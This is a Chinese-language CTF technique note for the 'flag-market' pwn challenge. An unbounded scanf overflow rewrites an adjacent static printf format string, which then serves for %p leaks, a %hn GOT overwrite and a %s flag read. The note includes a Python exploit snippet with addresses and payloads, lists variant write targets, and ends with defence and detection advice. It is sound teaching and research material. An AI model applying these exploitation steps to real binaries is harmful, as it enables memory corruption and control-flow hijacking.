---
id: binary-pwn-format-string-scanf-overflow-adjacent-format-string
title: scanf 无界写入覆盖相邻 .data 格式化字符串：把静态 printf 变成格式化字符串漏洞读写 flag
type: scenario
domain: binary
path: binary/pwn/format-string
technique: scanf-overflow-adjacent-format-string
aliases:
- flag-market
- scanf 覆盖 format 字符串
- 静态 printf 变格式化字符串
- 相邻 .data 字符串覆写
- 溢出改写 printf 格式串
tags:
- pwn
- format-string
- scanf
- data-overflow
- got
- arbitrary-read
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V171
  verified_at: '2026-11-06T17:42:43+08:00'
  notes: 已读全文与 2 张图核对：flag-market 的 scanf("%s", oflag) 无界写、oflag 0x100 与 0x4041C0 format 相邻、静态 printf 被污染、%9$p 泄露 +0x1e0、%12$hn 写 exit@got 0x404090、%12$s 读 flag 均与 exp 一致；原文未附 flag 回显，PoC 未本机复跑。
---

## 一句话结论

当程序把用户输入读入一个全局缓冲区，而该缓冲区后面紧挨着另一个 `printf("...")` 使用的静态格式字符串时，`scanf("%s", oflag)` 这类无界写入可以覆盖后面的格式串；下一轮循环执行 `printf(format)` 时就会把攻击者写入的内容当成格式串，把原本安全的静态 `printf` 变成可 `%p` 泄露、`%n` 任意写、`%s` 任意读的格式化字符串漏洞。

## 原理

- **相邻布局**：二进制 `.data` 中 `oflag` 是 0x100 字节的全局缓冲区，紧接着 0x4041C0 处是 `format` 字符串 `"You are so parsimonious!!!"`（0x20 字节空间）。`scanf("%s", oflag)` 不限制长度，输入 0x100 字节填满 `oflag` 后，后续字节正好覆盖 `format`。
- **静态 printf 变成可控格式串**：`printf("You are so parsimonious!!!")` 在编译后实际是 `printf(format)`，其中 `format` 指向 0x4041C0。正常执行时它只输出固定文本；被覆盖后，`printf` 会把攻击者写入的 `%p/%n/%s` 解释为格式指令，形成格式化字符串漏洞。
- **触发时机**：程序主循环在支付金额不等于 0xFF 时执行 `printf("You are so parsimonious!!!")`；因此在 `scanf` 写入覆盖格式串后，只要让循环回到该分支（例如先走一次 0xFF 的 flag 读取/报错路径，再重新进入支付分支），下一次 `printf` 就会使用被污染的格式串。
- **泄漏与任意写**：格式串中 `%9$p` 可读取栈上第 9 个参数（原文用于泄露 flag 缓冲区地址附近的栈指针）；`%<N>c%12$hn` 把已输出字符数（低 16 位）写到栈上第 12 个参数指向的地址。把目标 GOT 地址（如原文 0x404090 `exit@got[plt]`）放到输入缓冲区对应位置，即可用 `%hn` 改写 GOT 低 2 字节。
- **任意读**：第二轮把格式串改成 `%12$s`，并把目标地址（由第一轮泄露的 flag 缓冲区地址 + 偏移得到）放到第 12 个参数位置，`printf` 就会把该地址处的字符串输出，从而读出 flag。
- **为什么成立**：问题的本质不是 `printf` 本身接收了用户输入，而是“相邻全局变量的溢出”把常量格式串改写成了用户数据；很多审计只看 `printf` 的参数是否为用户输入，容易漏掉这种“格式串被前置溢出污染”的路径。

## 触发条件

- 存在无界字符串输入（`scanf("%s")`、`gets`、`strcpy` 等）写入一个全局/静态缓冲区，且该缓冲区与某个 `printf`/`fprintf` 使用的静态格式字符串相邻，或溢出能覆盖到它。
- 程序后续确实会执行到该 `printf`，且格式串指针指向被覆盖的内存。
- 二进制未开启 Full RELRO（便于 GOT 覆写），或可改用 `%s` 任意读/其他写目标；PIE 关闭或可泄露基址。
- 覆盖格式串的可用长度足够容纳 `%p`/`%n`/`%s` 等指令（原文约 0x20 字节空间）。

## 利用步骤

1. 审计 `.data`/`.bss` 布局，确认输入缓冲区与格式字符串的相对位置；用 gdb 在 `printf` 前断点，确认格式串指针指向被覆盖的 `format`。
2. 构造第一轮输入：`b'a' * 0x100 + b'%9$p' + b'%<N>c' + b'%12$hn'`，填满 `oflag` 并把格式串改成泄露 + 写 GOT 的指令。
3. 在程序下一次询问地址/参数时，把目标 GOT 地址（如 `exit@got`）按第 12 个参数的位置放入输入缓冲区，使 `%12$hn` 写到该地址；`%<N>c` 的 N 决定写入的低 16 位值。
4. 解析 `%9$p` 的输出，计算栈/目标缓冲区地址；原文用泄露值 + 0x1e0 得到 flag 缓冲区地址。
5. 构造第二轮输入：`b'a' * 0x100 + b'%12$s'`，并在参数位置放入 `p64(flag_addr)`；`printf` 用 `%s` 输出 flag 缓冲区内容。
6. 若 GOT 改写用于劫持控制流，按目标二进制选择合适函数/后门地址；若只需要读 flag，可直接走 `%s` 任意读。

## PoC

原文 exp 的关键结构（地址按原题，未在本机复跑，原文未附 flag 回显）：

```python
def ak1():
    rt("2.exit\n"); sl("1")
    rt("how much you want to pay?"); sl("255")
    # 第一次：填满 oflag 0x100 字节，覆盖 format 为格式化字符串
    pd  = b'a' * 0x100
    pd += b'%9$p' + b'%' + str(5011).encode() + b'c' + b'%12$hn'
    sla(b':', pd)

    # 第二轮：在参数位置放 GOT 地址，供 %12$hn 写入
    sla(b'exit', str(1))
    io.sendlineafter(b'how much you want to pay?\n', p64(0x0404090))
    flag = int(io.recv(10), 16) + 0x1e0      # 泄露值 + 偏移 = flag 缓冲区地址

    # 第三轮：把 format 改成 %12$s，参数位置放 flag 地址，读 flag
    io.sendlineafter(b'exit', str(2))
    sla("2.exit\n", "1")
    sla(b'pay?', str(255))
    sla(b':', b'a' * 0x100 + b'%12$s')
    sla(b'exit', str(1))
    sla(b'?', p64(flag))
```

要点：

```text
oflag:  0x100 字节全局缓冲区
format: 紧随 oflag 的 "You are so parsimonious!!!" 字符串
scanf("%s", oflag) 写入 b'a'*0x100 + 格式化指令  -> 覆盖 format
后续 printf(format) -> 执行 %9$p / %12$hn / %12$s
```

## 变体与关联

- 变体：溢出源可换成 `gets`、`strcpy`、`read` 等；只要能把 `printf` 使用的静态格式串覆盖即可。
- 变体：不写 GOT 时可直接用 `%s` 读取任意地址；若目标开启 Full RELRO，可改为写栈返回地址、`__malloc_hook`/`__free_hook`（旧 glibc）或 `exit_funcs`。
- 变体：若格式串空间很小，可分段写多轮 `%hn`，或把格式串指针改到更大的可控缓冲区（如 BSS 上的输入区）。
- 关联：[[binary-pwn-format-string-got-hijack]]（标准 `%n` 覆写 GOT）、[[binary-pwn-format-string-nonstack-pointer-chain-got-overwrite]]（非栈上格式化字符串写 GOT）、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（格式化字符串泄露 Canary/libc 后 ROP）。

## 检测与防御

- **根因修复**：所有字符串输入使用带长度限制的函数（`fgets`、`scanf("%255s")`、`read` 上限），并校验缓冲区边界；不要依赖“`printf` 的参数是常量”就认为安全。
- **格式串保护**：把格式字符串放到只读段（`.rodata`）而不是可写的 `.data`/`.bss`；编译加 `-Wformat-security`、`_FORTIFY_SOURCE=2`。
- **加固**：开启 Full RELRO、PIE、Canary；对敏感 GOT/函数指针使用只读重定位。
- **检测**：二进制审计中检查“输入缓冲区后紧邻格式字符串”的布局；运行时监控 `printf` 格式串地址落在可写数据段、输出中出现 `%p/%n/%s` 序列、GOT 低 2 字节被改写。
